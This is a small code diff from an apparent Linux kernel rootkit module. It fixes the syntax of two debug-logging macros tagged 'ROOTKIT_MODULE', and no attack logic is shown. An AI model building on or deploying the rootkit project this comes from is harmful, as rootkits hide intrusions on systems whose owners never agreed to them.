@@ -59,16 +59,16 @@ struct data_node {
 
 /* variadic macro for debug messages */
 #define debug(str, ...) 					\
-(if (DEBUG_ENABLED) {			 			\
+if (DEBUG_ENABLED) {			 			\
 	pr_info("[ ROOTKIT_MODULE ] [ %s ] " str "\n", 		\
 		__func__, ##__VA_ARGS__); 			\
-})
+}
 
 #define alert(str, ...) 					\
-(if (DEBUG_ENABLED) { 						\
+if (DEBUG_ENABLED) { 						\
 	pr_warn("[ ROOTKIT_MODULE ] [ %s ] " str "\n", 		\
 		__func__, ##__VA_ARGS__); 			\
-})
+}
 
 /* list functions */
 
